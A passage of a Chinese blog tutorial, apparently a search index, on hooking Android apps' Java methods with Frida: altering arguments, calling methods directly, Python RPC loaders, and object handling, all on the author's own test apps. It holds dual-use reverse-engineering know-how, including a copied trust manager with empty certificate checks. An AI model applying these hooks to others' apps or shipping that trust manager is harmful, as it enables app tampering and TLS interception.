","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:2:4","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Frida脚本入门 Frida脚本就是利用Frida动态插桩框架,使用Frida导出的API和方法对内存空间里的对象方法进行监视、修改和替换的一段代码. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:3:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Hook基础 准备一个测试apk. package org.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(LuoTst(1, 2)); } }); } String LuoTst(int n1, int n2){ return \"Luo\" + String.valueOf(n1 + n2); } } 本次我们Hook的目的是修改函数LuoTst的参数. 编写Js脚本进行Hook. function main() { console.log(\"Script loaded successfully \"); Java.perform(function() { console.log(\"Inside java perform function\"); //定位类 var MainActivity = Java.use(\"org.example.luodst.MainActivity\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) MainActivity.LuoTst.implementation = function (x, y) { //打印替换前的参数. console.log(\"original call: LuoTst(\" + x + \", \" + y + \")\"); //把参数替换成20和50,依旧调用原函数. var ret_value = this.LuoTst(20, 50); return ret_value; } }); } setImmediate(main) 脚本中使用function关键字定义了一个main函数,用于存放Hook脚本,然后调用Frida的API函数java.perform()将脚本中的内容注入到Java运行库.这个API的参数是一个匿名函数,函数内容是监控和修改Java函数逻辑的主体内容.注意,这里的Java.perform()函数非常重要,任何对App中Java层的操作都必须包裹在这个函数中,否则Frida运行起来后就会报错. 在Java.perform()函数包裹的匿名函数中,首先调用了Frida的API函数Java.use(),这个函数的参数是Hook的函数所在类的类名,参数的类型是一个字符串类型.这个函数的返回值动态地为相应Java类获取一个JavaScriptWrapper,可以通俗理解为一个JavaScript对象. 在获取到对应的JavaScript对象后,通过\".“符号连接LuoTst这个对应的函数名,然后加上implementation关键词表示实现MainActivity对象的LuoTst()函数,最后通过”=“这个符号连接一个匿名函数,参数内容和原Java的内容一致.不同的是,JavaScript是一个弱类型的语言,不需要指明参数类型.此时一个针对MainActivity类的LuoTst()函数的Hook框架就完成了. 在Hook一个函数时,需要注意一个地方,那就是不要修改被Hook函数的返回值类型,否则会引起程序崩溃等问题. setImmediate(Frida的API函数)函数传递的参数是要被执行的函数,比如传入main参数,表示当Frida注入App后立即执行main函数.这个函数和setTimeout()函数类似,都是用于指定要执行的函数,不同的是setTimeout可以用于指定Frida注入App多长时间后执行函数,往往用于延时注入.如果传递的第二个参数为0或者压根没有第二个参数,就和setImmediate()函数的作用一样. 手机端执行frida-server,PC端执行Js脚本. //手机端 adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server //PC端 //CLI模式 //Frida脚本是及时生效的,第一次注入使用下述命令,后续修改脚本内容,不用重新注入,只要重新保存脚本内容即可. frida -U -l luoHook.js LuoDst Hook后,点击按钮显示 Luo:70 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:3:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Java重载函数Hook 准备一个测试apk. package org.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(LuoTst(1, 2)); } }); } String LuoTst(int n1, int n2){ return String.valueOf(n1 + n2); } String LuoTst(String str){ return str.toLowerCase(); } } 可以看到LuoTst()方法有了重载,在参数是两个int类型的情况下,返回两个整数之和;当参数类型为String类型时,返回字符串的小写形式. 本次我们Hook的目的是修改重载函数LuoTst(int, int)的参数. 编写Js脚本进行Hook. function main() { console.log(\"Script loaded successfully \"); Java.perform(function() { console.log(\"Inside java perform function\"); //定位类 var MainActivity = Java.use(\"org.example.luodst.MainActivity\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation). MainActivity.LuoTst.overload('int', 'int').implementation = function (x, y) { //打印替换前的参数. console.log(\"original call: LuoTst(\" + x + \", \" + y + \")\"); //把参数替换成20和50,依旧调用原函数. var ret_value = this.LuoTst(20, 50); return ret_value; } }); } setImmediate(main) Frida对于函数重载Hook问题,提供了解决方案(func.overload()),就是指定函数签名.如上述中在要Hook的函数名后、关键词implementation之前添加.overload(‘int’, ‘int’)来指明具体Hook的重载函数,对于String类型,可以添加.overload(‘java.lang.String’) 手机端执行frida-server,PC端执行Js脚本. //手机端 adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server //PC端 //CLI模式 //Frida脚本是及时生效的,第一次注入使用下述命令,后续修改脚本内容,不用重新注入,只要重新保存脚本内容即可. frida -U -l luoHook.js LuoDst Hook后,点击按钮显示 70 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:3:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"主动调用 主动调用就是强制调用一个函数去执行.相应地,被动调用是由App按照正常逻辑去执行函数,函数的执行完全依靠与用户交互完成程序逻辑进而间接调用到关键函数,而主动调用则可以直接调用关键函数,主动性更强,甚至可以直接完成关键数据的\"自吐”.在逆向分析过程中,如果不想分析详细的算法逻辑,可以直接通过主动传递参数来调用关键算法函数,忽略方法函数的实现过程直接得到密文或者明文,可以说是各种算法调用的\"克星\". 在Java中,类中的函数可分为两种:类函数和实例方法.通俗的讲,就是静态的方法和动态的方法.类函数使用关键字static修饰,和对应类是绑定的,如果类函数还被public关键字修饰,在外部就可以直接通过类去调用.实例方法没有关键字static修饰,在外部只能通过创建对应类的实例再通过这个实例去调用. 在Frida中主动调用的类型会根据方法类型区分,如果是类函数的主动调用,直接使用Java.use()函数找到类进行调用即可;如果是实例方法的主动调用,则需要在找到对应的实例后对方法进行调用.这里用到了Frida中非常重要的一个API函数Java.choose(),这个函数可以在Java的堆中寻找指定类的实例. 示例 准备一个测试apk. package org.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(LuoTst(1, 2)); } }); } String LuoTst(int n1, int n2){ return String.valueOf(n1 + n2); } String LuoTst(String str){ return str.toLowerCase(); } void secret(){ Log.d(\"LuoHun\", \"this is secret func\"); } static void staticSecret(){ Log.d(\"LuoHun\", \"this is static secret func\"); } } 上述代码中新增了两个secret()函数,一个是没有static修饰的secret实例方法,一个是有static关键字修饰的staticSecret类方法. 本次我们Hook的目的是主动调用静态函数staticSecret以及动态函数secret. 编写Js脚本进行Hook. function main() { console.log(\"Script loaded successfully \"); Java.perform(function() { console.log(\"Inside java perform function\"); //静态函数主动调用 var MainActivity = Java.use(\"org.example.luodst.MainActivity\") MainActivity.staticSecret() //动态函数主动调用 Java.choose(\"org.example.luodst.MainActivity\",{ onMatch: function(instance){ console.log(\"instance found\", instance) instance.secret() }, onComplete: function(){ console.log(\"search Complete\") } }) }); } setImmediate(main) 手机端执行frida-server,PC端执行Js脚本. //手机端 adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server //PC端 //CLI模式 //Frida脚本是及时生效的,第一次注入使用下述命令,后续修改脚本内容,不用重新注入,只要重新保存脚本内容即可. frida -U -l luoHook.js LuoDst Hook后,可以看到新增了两条日志. 如果需要主动调用动态函数,必须确保存在相应类的对象,否则无法进入Java.choose这个API的回调onMatch逻辑中.比如MainActivity类对象,由于App在打开后确实运行在MainActivity界面上,那么这个对象就一定会存在,这就是所谓的\"所见即所得\"思想,这个思想在主动调用的过程中非常重要. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:3:3","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"RPC及其自动化 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:4:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"远程调用 在Frida中,可以使用Python完成JavaScript脚本对进程的注入以及相应的Hook. 准备一个测试apk. package org.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { private String total = \"Hello\"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(LuoTst(1, 2)); } }); } String LuoTst(int n1, int n2){ return String.valueOf(n1 + n2); } String LuoTst(String str){ return str.toLowerCase(); } void secret(){ total +=\" secretFunc\"; Log.d(\"LuoHun\", \"this is secret func\"); } static void staticSecret(){ Log.d(\"LuoHun\", \"this is static secret func\"); } } 在上述代码中,增加了一个字符串类型的实例变量total,同时每次调用secret()函数对字符串进行扩展.本次我们Hook的目的是获取total这个实例变量的值. 在主动调用时需要注意的是,Java中的变量也存在是否使用static修饰的区别. 编写Js脚本进行Hook. function CallSecretFunc() { Java.perform(function () { //动态函数主动调用 Java.choose(\"org.example.luodst.MainActivity\", { onMatch: function (instance) { instance.secret() }, onComplete: function () {} }) }); } function getTotalValue() { Java.perform(function () { //动态字段主动调用 Java.choose(\"org.example.luodst.MainActivity\", { onMatch: function (instance) { console.log(\"total value = \", instance.total.value) }, onComplete: function () {} }) }) } rpc.exports = { callsecretfunc: CallSecretFunc, gettotalvalue: getTotalValue }; 如果要获取变量的值,只需要在变量后加上一个.value关键词.如上述的total.value 上述代码最后的RPC代码实现的功能是将CallSecretFunc()函数和getTotalValue()函数分别导出为callsecretfunc和gettotalvalue.需要注意的是,导出名不可以有大写字母或者下划线. 编写Python代码来加载上述的Js代码. import frida import sys def on_message(message, data): if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) else: print(message) #无线连接 # /data/local/tmp/frida-server -l 0.0.0.0:6666 # Wifi ADB监听IP和端口为192.168.2.111:5555 #device = frida.get_device_manager().add_remote_device(\"192.168.2.111:6666\") #有线连接 device = frida.get_usb_device() process = device.attach(\"com.example.luodst\") with open(\"luoHook.js\", encoding = \"UTF-8\") as f: jsCode = f.read() script = process.create_script(jsCode) script.on('message', on_message) script.load() command = \"\" while 1 == 1: command = input(\"\\nEnter command:\\n1: Exit\\n2: Call secret function\\n3: Get Total Value\\nchoice:\") if command == \"1\": break elif command == \"2\": script.exports.callsecretfunc() elif command == \"3\": script.exports.gettotalvalue() 重新运行App,然后直接运行loader.py,运行结果如下图. 和单纯执行JavaScript是一致的,下面对Frida相关代码进行说明. 首先通过frida.get_usb_device()获取到USB设备句柄;然后通过device.attach(“LuoDst”)对LuoDst这个进行进行注入;接着使用create_script()函数加载上述编写的JavaScript代码,并使用script.on(‘message’, on_message)注册了自己的消息对应的函数,每当JavaScript想要输出时,都会经过这里指定的on_message进行;最后,也就是最重要的RPC调用代码,即通过script.exports访问所有我们在JavaScript中定义的导出名,进而调用导出函数.这样就完成了RPC远程调用,达到了在主机上可以随意调用App代码的目的. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:4:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"互联互通 本次实验主要是记录Frida中Python和JavaScript代码的互通过程,由Python发送数据到JavaScript进而影响Hook的结果. 准备一个测试Apk. package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.view.View; import android.widget.Button; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button btn = findViewById(R.id.button); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { TextView tv = findViewById(R.id.tv); tv.setText(\"Hello com.example.luodst !\"); } }); } } 本次我们Hook的目标函数是android.widget.TextView.setText(CharSequence text) JavaScript代码. //luoHook.js Java.perform(function () { console.log(\"Inside java perform function\"); Java.use(\"android.widget.TextView\").setText.overload('java.lang.CharSequence').implementation = function (x) { var strSend = x.toString(); var strRecv; send(strSend); recv(function (received_json_objection) { strRecv = received_json_objection.my_data; console.log(\"strRecv \", strRecv) }).wait() var javaStr = Java.use('java.lang.String').$new(strRecv); var result = this.setText(javaStr) console.log(\"javaStr result\", javaStr, result) return result } }) Python代码. #loader.py import frida import sys def on_message(message, payload): print(message) if message['type'] == 'send': print(message[\"payload\"]) data = \"Hello XiaLuoHun !\" script.post({\"my_data\": data}) print(\"Modified data send !\") #无线连接 # /data/local/tmp/frida-server -l 0.0.0.0:6666 # Wifi ADB监听IP和端口为192.168.2.111:5555 #device = frida.get_device_manager().add_remote_device(\"192.168.2.111:6666\") #有线连接 device = frida.get_usb_device() process = device.attach(\"com.example.luodst\") with open(\"luoHook.js\", encoding=\"UTF-8\") as f: jsCode = f.read() script = process.create_script(jsCode) script.on('message', on_message) script.load() input() 运行结果如下图. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:4:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"参数构造 使用Frida的JavaScript API https://frida.re/docs/javascript-api/ 重要思路:开发时如何打印,Frida中也是如何打印. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:5:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"数组 Java代码 package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d(\"SimpleArray\", \"onCreate: SImpleArray\"); char arr[][] = new char[4][]; // 创建一个4行的二维数组 arr[0] = new char[] { '春', '眠', '不', '觉', '晓' }; // 为每一行赋值 arr[1] = new char[] { '处', '处', '闻', '啼', '鸟' }; arr[2] = new char[] { '夜', '来', '风', '雨', '声' }; arr[3] = new char[] { '花', '落', '知', '多', '少' }; Log.d(\"SimpleArray\", \"-----横版-----\"); for (int i = 0; i \u003c 4; i++) { // 循环4行 Log.d(\"SimpleArraysToString\", Arrays.toString(arr[i])); //Log.d(\"SimpleStringBytes\", Arrays.toString (Arrays.toString (arr[i]).getBytes())); for (int j = 0; j \u003c 5; j++) { // 循环5列 //Log.d(\"SimpleArray\", Character.toString(arr[i][j])); // 输出数组中的元素 } if (i % 2 == 0) { Log.d(\"SimpleArray\", \",\");// 如果是一、三句，输出逗号 } else { Log.d(\"SimpleArray\", \"。\");// 如果是二、四句，输出句号 } } } } 目前想要Hook上述代码中如下语句: //Arrays.toString(arr[i]) 参数为数组 Log.d(\"SimpleArraysToString\", Arrays.toString(arr[i])); JavaScript代码 //Frida JavaScript API示例 //Java.array(type, elements) const values = Java.array('int', [ 1003, 1005, 1007 ]); const JString = Java.use('java.lang.String'); const str = JString.$new(Java.array('byte', [ 0x48, 0x65, 0x69 ])); //Hook代码 function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { console.log(\"Inside java perform function\"); //定位类 var clsArrays = Java.use(\"java.util.Arrays\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) clsArrays.toString.overload('[C').implementation = function (x) { //这里x的类型是一个char数组 //构造一个char数组 var charArray = Java.array('char', [ '一','去', '二', '三', '里' ]); var result = this.toString(charArray) //关注这里打印的日志 console.log(\"x, result\", JSON.stringify(charArray), result) return result } }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:5:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"强制类型转换 在Frida中,将父类转换为子类是不行的,但是可以把子类转换为父类,从而调用父类的方法. Java代码 package com.example.luodst; import android.util.Log; public class Water { // 水 类 public static String flow(Water W) { // 水 的方法 // SomeSentence Log.d(\"2Object\", \"water flow: I`m flowing\"); return \"water flow: I`m flowing\"; } public String still(Water W) { // 水 的方法 // SomeSentence Log.d(\"2Object\", \"water still: still water runs deep!\"); return \"water still: still water runs deep!\"; } } package com.example.luodst; import android.util.Log; public class Juice extends Water { // 果汁 类 继承了水类 public String fillEnergy() { Log.d(\"2Object\", \"Juice: i`m fillingEnergy!\"); return \"Juice: i`m fillingEnergy!\"; } public static void main() { Water w1 = new Water(); flow(w1); // Juice J = new Juice(); // 实例化果汁类对象 flow(J); // 调用水的方法 向上转型 J → W Water w2 = new Juice(); ((Juice) w2).fillEnergy(); } } package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Juice.main(); } } JavaScript代码 //Frida JavaScript API示例 //Java.cast(handle, klass) const Activity = Java.use('android.app.Activity'); const activity = Java.cast(ptr('0x1234'), Activity); function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { var JuiceHandle = null ; Java.choose(\"com.example.luodst.Juice\",{ onMatch:function(instance){ console.log(\"found instance :\",instance); console.log(\"filling energy,\",instance.fillEnergy()); JuiceHandle= instance; },onComplete:function(){\"Search Completed!\"} }) var WaterHandle = Java.cast(JuiceHandle ,Java.use(\"com.example.luodst.Water\")); console.log(\"Water invoke still \", WaterHandle.still(WaterHandle)); }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:5:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"接口 Java代码 package com.example.luodst; public interface liquid { public String flow(); } package com.example.luodst; import android.util.Log; public class milk implements liquid { public String flow() { Log.d(\"3interface\", \"flowing : interface \"); return \"nihao\"; } public static void main() { milk m = new milk(); m.flow(); } } package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); milk.main(); } } JavaScript代码 //Frida JavaScript API示例 //Java.registerClass(spec) const SomeBaseClass = Java.use('com.example.SomeBaseClass'); const X509TrustManager = Java.use('javax.net.ssl.X509TrustManager'); const MyTrustManager = Java.registerClass({ name: 'com.example.MyTrustManager', implements: [X509TrustManager], methods: { checkClientTrusted(chain, authType) { }, checkServerTrusted(chain, authType) { }, getAcceptedIssuers() { return []; }, } }); function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { var beer = Java.registerClass({ name: 'com.example.luodst.beer', implements: [Java.use('com.example.luodst.liquid')], methods: { flow: function () { console.log(\"look I`m beer!\"); return \"taste good!\"; } } }); console.log(\"beer.flow:\",beer.$new().flow()); }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:5:3","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"枚举 https://www.cnblogs.com/jingmoxukong/p/6098351.html Java枚举.pdf 除了不能继承,基本上可以把枚举看做一个常规的类. Java代码 package com.example.luodst; import android.util.Log; enum Signal { GREEN, YELLOW, RED } public class TrafficLight { public static Signal color = Signal.RED; public static void main() { //Log.d(\"4enum\", \"enum \"+ color.getClass().getName().toString()); Log.d(\"4enum\", \"enum \"+ color); switch (color) { case RED: color = Signal.GREEN; break; case YELLOW: color = Signal.RED; break; case GREEN: color = Signal.YELLOW; break; } } } package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); TrafficLight.main(); } } JavaScript代码 function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { Java.choose(\"com.example.luodst.Signal\",{ onMatch:function(instance){ console.log(\"found instance:\",instance) console.log(\"invoke getDeclaringClass\",instance.getDeclaringClass()) },onComplete:function(){console.log(\"Search Completed!\")} }) }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:5:4","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Map Java代码 package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; import java.util.HashMap; import java.util.Iterator; import java.util.Map; import java.util.Set; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Map\u003cString, String\u003e LuoMap = new HashMap\u003c\u003e(); // 创建Map集合对象 LuoMap.put(\"ISBN 978-7-5677-8742-1\", \"Android项目开发实战入门\"); // 向Map集合中添加元素 LuoMap.put(\"ISBN 978-7-5677-8741-4\", \"C语言项目开发实战入门\"); LuoMap.put(\"ISBN 978-7-5677-9097-1\", \"PHP项目开发实战入门\"); LuoMap.put(\"ISBN 978-7-5677-8740-7\", \"Java项目开发实战入门\"); //Log.d(\"5map\", \"key值toString\"+LuoMap.toString()); Set\u003cString\u003e set = LuoMap.keySet(); // 构建Map集合中所有key的Set集合 Iterator\u003cString\u003e it = set.iterator(); // 创建Iterator迭代器 Log.d(\"5map\", \"key值：\"); while (it.hasNext()) { // 遍历并输出Map集合中的key值 try { Thread.sleep(1000); Log.d(\"5map\", it.next()+\" \"); } catch (InterruptedException e) { e.printStackTrace(); } } } } JavaScript代码 下述代码,用来打印Map中存放的值. function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { Java.choose(\"java.util.HashMap\", { onMatch: function (instance) { if (instance.toString().indexOf(\"ISBN\") != -1) { console.log(\"found instance:\", instance) console.log(\"invoke \", instance.toString()) } }, onComplete: function () { console.log(\"Search Completed!\") } }) }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:5:5","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Non-ASCII https://api-caller.com/2019/03/30/frida-note/ Frida-Non-ASCII.pdf Java代码 package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; import java.util.HashMap; import java.util.Iterator; import java.util.Map; import java.util.Set; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d(\"LuoHun\", \"onCreate: \" + ֏(10)); } int ֏(int x) { return x + 100; } } JavaScript代码 function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { var targetClass = \"com.example.luodst.MainActivity\"; var hookCls = Java.use(targetClass); var methods = hookCls.class.getDeclaredMethods(); for (var i in methods) { console.log(methods[i].toString()); console.log(encodeURIComponent(methods[i].toString().replace(/^.*?\\.([^\\s\\.\\(\\)]+)\\(.*?$/, \"$1\"))); } hookCls[decodeURIComponent(\"%D6%8F\")] .implementation = function (x) { console.log(\"original call: fun(\" + x + \")\"); var result = this[decodeURIComponent(\"%D6%8F\")](900); return result; } }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:5:6","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"小技巧 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:6:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"打印堆栈 function main() { console.log(\"Script loaded successfully \"); Java.perform(function() { console.log(\"Inside java perform function\"); //定位类 var MainActivity = Java.use(\"com.example.luodst.MainActivity\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) MainActivity.LuoTst.implementation = function (x, y) { //打印堆栈调用 console.log(Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Throwable\").$new())); //打印替换前的参数. console.log(\"original call: LuoTst(\" + x + \", \" + y + \")\"); //把参数替换成20和50,依旧调用原函数. var ret_value = this.LuoTst(20, 50); return ret_value; } }); } setImmediate(main) ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:6:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"启动一个App并Hook //frida -U -f com.example.luodst -l luoHook.js //%resume //-f选项 就是创建一个进程 frida -U -f com.example.luodst -l luoHook.js --no-pause ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:6:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"打印Object 可以调Gson库或者使用Frida内部的API来打印. https://github.com/google/gson 现象 Java代码如下: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import java.util.Arrays; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d(\"SimpleArray\", \"onCreate: SImpleArray\"); char arr[][] = new char[4][]; // 创建一个4行的二维数组 arr[0] = new char[] { '春', '眠', '不', '觉', '晓' }; // 为每一行赋值 arr[1] = new char[] { '处', '处', '闻', '啼', '鸟' }; arr[2] = new char[] { '夜', '来', '风', '雨', '声' }; arr[3] = new char[] { '花', '落', '知', '多', '少' }; Log.d(\"SimpleArray\", \"-----横版-----\"); for (int i = 0; i \u003c 4; i++) { // 循环4行 Log.d(\"SimpleArraysToString\", Arrays.toString(arr[i])); //Log.d(\"SimpleStringBytes\", Arrays.toString (Arrays.toString (arr[i]).getBytes())); for (int j = 0; j \u003c 5; j++) { // 循环5列 //Log.d(\"SimpleArray\", Character.toString(arr[i][j])); // 输出数组中的元素 } if (i % 2 == 0) { Log.d(\"SimpleArray\", \",\");// 如果是一、三句，输出逗号 } else { Log.d(\"SimpleArray\", \"。\");// 如果是二、四句，输出句号 } } } } 目前想要Hook上述代码中如下语句: //Arrays.toString(arr[i]) 参数为数组 Log.d(\"SimpleArraysToString\", Arrays.toString(arr[i])); 编写的JavaScript代码如下: function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { console.log(\"Inside java perform function\"); //定位类 var clsArrays = Java.use(\"java.util.Arrays\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) clsArrays.toString.overload('[C').implementation = function (x) { var result = this.toString(x) //关注这里打印的日志 console.log(\"x, result\", x, result) return result } }); } setImmediate(main) Frida内部API打印 function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { console.log(\"Inside java perform function\"); //定位类 var clsArrays = Java.use(\"java.util.Arrays\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) clsArrays.toString.overload('[C').implementation = function (x) { var result = this.toString(x) //关注这里打印的日志 console.log(\"x, result\", JSON.stringify(x), result) return result } }); } setImmediate(main) Gson打印 https://bbs.pediy.com/thread-259186.htm 用法如下: adb push到fridaserver同目录下之下. 代码. Java.openClassFile(\"/data/local/tmp/r0gson.dex\").load(); const gson = Java.use('com.r0ysue.gson.Gson'); console.log(gson.$new().toJson(xxx)); function main() { console.log(\"Script loaded successfully \"); Java.perform(function () { console.log(\"Inside java perform function\"); Java.openClassFile(\"/data/local/tmp/r0gson.dex\").load(); const gson = Java.use('com.r0ysue.gson.Gson'); //console.log(gson.$new().toJson(xxx)); //定位类 var clsArrays = Java.use(\"java.util.Arrays\"); console.log(\"Java.Use.Successfully!\"); //定位类成功！ //在这里更改类方法的实现(implementation) clsArrays.toString.overload('[C').implementation = function (x) { var result = this.toString(x) //关注这里打印的日志 console.log(\"x, result\", 